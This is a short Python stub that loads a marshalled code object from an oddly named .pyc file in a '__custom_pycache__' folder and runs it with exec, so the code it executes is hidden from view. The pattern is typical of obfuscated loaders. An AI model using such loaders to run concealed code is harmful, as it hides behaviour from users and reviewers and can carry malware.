
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Image_0c9c294ed1924dc585862a51fb75df46.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
